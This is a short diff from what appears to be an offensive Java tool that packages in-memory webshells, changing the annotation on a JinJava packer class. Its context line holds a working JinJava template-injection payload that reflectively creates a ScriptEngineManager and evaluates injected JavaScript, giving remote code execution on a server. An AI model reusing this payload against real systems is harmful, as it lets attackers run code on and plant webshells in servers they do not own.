@@ -5,7 +5,7 @@ import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.PackerRegistry;
 
-@PackerMeta(name = "JinJava", order = 100)
+@PackerMeta(name = "JinJava", order = 100, dependencies = "DefaultScriptEngine")
 public class JinJavaPacker implements Packer {
     String template = "{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('{{script}}')) }}";
 
